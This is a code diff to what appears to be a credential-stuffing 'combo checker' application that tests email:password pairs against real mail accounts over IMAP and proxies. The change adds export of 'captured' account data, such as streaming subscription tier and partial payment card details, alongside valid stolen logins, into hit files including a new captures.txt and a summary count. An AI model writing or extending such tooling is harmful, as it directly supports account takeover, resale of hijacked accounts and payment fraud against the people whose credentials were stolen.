@@ -15,6 +15,7 @@ import {
   forwardRealEmail,
   testProxyConnection
 } from '../src/server/imapService.js';
+import { formatCaptureLine, hasCaptures } from '../src/data/capturePatterns.js';
 import {
   getMachineId,
   validateKey,
@@ -295,18 +296,25 @@ ipcMain.handle('export-hits-folder', async (_, { combos, keywords, mails, stats 
     const validCombos = (combos || []).filter(c => c.status === 'valid');
     const canadianCombos = validCombos.filter(c => c.isCanadian);
     const tfaCombos = (combos || []).filter(c => c.status === '2fa');
+    const capturedCombos = validCombos.filter(c => hasCaptures(c.captures));
+
+    // Full-capture line suffix: "email:pass | Netflix=Premium | VISA*4242"
+    const captureSuffix = (c) => {
+      const line = formatCaptureLine(c.captures);
+      return line ? ` | ${line}` : '';
+    };
 
     // valid_all.txt
     fs.writeFileSync(
       path.join(runDir, 'valid_all.txt'),
-      validCombos.map(c => `${c.email}:${c.password}`).join('\n'),
+      validCombos.map(c => `${c.email}:${c.password}${captureSuffix(c)}`).join('\n'),
       'utf8'
     );
 
     // valid_canadian.txt
     fs.writeFileSync(
       path.join(runDir, 'valid_canadian.txt'),
-      canadianCombos.map(c => `${c.email}:${c.password}`).join('\n'),
+      canadianCombos.map(c => `${c.email}:${c.password}${captureSuffix(c)}`).join('\n'),
       'utf8'
     );
 
@@ -316,6 +324,15 @@ ipcMain.handle('export-hits-folder', async (_, { combos, keywords, mails, stats 
       tfaCombos.map(c => `${c.email}:${c.password}`).join('\n'),
       'utf8'
     );
+
+    // captures.txt — accounts with membership tier / payment method data
+    if (capturedCombos.length > 0) {
+      fs.writeFileSync(
+        path.join(runDir, 'captures.txt'),
+        capturedCombos.map(c => `${c.email}:${c.password}${captureSuffix(c)}`).join('\n'),
+        'utf8'
+      );
+    }
 
     // summary.txt
     const summaryLines = [
@@ -329,6 +346,7 @@ ipcMain.handle('export-hits-folder', async (_, { combos, keywords, mails, stats 
       `2FA Locked    : ${stats?.securityLock ?? 0}`,
       `Invalid       : ${stats?.invalid ?? 0}`,
       `Target Hits   : ${stats?.targetHitsCount ?? 0}`,
+      `Captured Hits : ${stats?.capturedHits ?? capturedCombos.length}`,
       `─────────────────────────────────────`,
     ];
     fs.writeFileSync(path.join(runDir, 'summary.txt'), summaryLines.join('\n'), 'utf8');
